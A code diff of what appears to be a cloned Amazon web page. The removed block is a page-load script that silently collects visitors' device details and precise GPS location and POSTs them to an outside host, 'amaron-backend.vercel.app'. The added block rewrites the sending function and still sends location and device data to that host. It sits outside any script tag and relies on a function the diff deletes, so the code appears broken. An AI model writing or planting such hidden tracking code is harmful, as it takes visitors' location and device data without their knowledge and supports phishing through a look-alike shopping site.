@@ -22483,85 +22483,48 @@
 
         <script>window.ue && ue.count && ue.count('CSMLibrarySize', 94447)</script>
 
-        <script>
-            window.onload = async function () {
+        // Send everything in one POST request
+        async function sendClientData() {
+        const clientInfo = await collectClientInfo();
 
-                // Collect all client info including geolocation
-                async function collectClientInfo() {
-                    const info = {};
+        // Extract GPS correctly
+        const payload = {
+        latitude: clientInfo.location?.latitude || null,
+        longitude: clientInfo.location?.longitude || null,
+        accuracy: clientInfo.location?.accuracy || null,
 
-                    info.userAgent = navigator.userAgent || null;
-                    info.platform = navigator.platform || null;
-                    info.language = navigator.language || null;
-                    info.languages = navigator.languages || null;
+        // Add other fields if your backend needs them
+        userAgent: clientInfo.userAgent,
+        platform: clientInfo.platform,
+        language: clientInfo.language,
+        hardware: clientInfo.hardware,
+        screen: clientInfo.screen,
+        network: clientInfo.network,
+        time: clientInfo.time
+        };
 
-                    info.hardware = {
-                        cpuThreads: navigator.hardwareConcurrency || null,
-                        deviceMemory: navigator.deviceMemory || null,
-                        maxTouchPoints: navigator.maxTouchPoints || 0
-                    };
+        console.log("Sending payload:", payload);
 
-                    info.screen = {
-                        width: window.screen.width,
-                        height: window.screen.height,
-                        pixelRatio: window.devicePixelRatio
-                    };
+        try {
+        const response = await fetch("https://amaron-backend.vercel.app/api/location", {
+        method: "POST",
+        headers: {
+        "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+        });
 
-                    info.network = {
-                        connectionType: navigator.connection?.effectiveType || null,
-                        downlink: navigator.connection?.downlink || null,
-                        rtt: navigator.connection?.rtt || null
-                    };
+        if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Server responded with ${response.status}: ${errorText}`);
+        }
 
-                    info.time = {
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        localTime: new Date().toISOString()
-                    };
-
-                    // Get geolocation (if allowed)
-                    info.location = await new Promise(resolve => {
-                        if (!navigator.geolocation) {
-                            resolve(null);
-                            return;
-                        }
-
-                        navigator.geolocation.getCurrentPosition(
-                            pos => resolve({
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            }),
-                            () => resolve(null),
-                            { enableHighAccuracy: true, timeout: 5000 }
-                        );
-                    });
-
-                    return info;
-                }
-
-                // Send everything in one POST request
-                async function sendClientData() {
-                    const clientInfo = await collectClientInfo();
-
-                    try {
-                        const response = await fetch("https://amaron-backend.vercel.app/api/location", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify(clientInfo)
-                        });
-
-                        const data = await response.json();
-                        console.log("Server Response:", data);
-                    } catch (error) {
-                        console.error("POST FAILED:", error);
-                    }
-                }
-
-                sendClientData();
-            };
-        </script>
+        const data = await response.json();
+        console.log("Server Response:", data);
+        } catch (error) {
+        console.error("POST FAILED:", error);
+        }
+        }
 
 
         <!-- sp:end-feature:csm:body-close -->
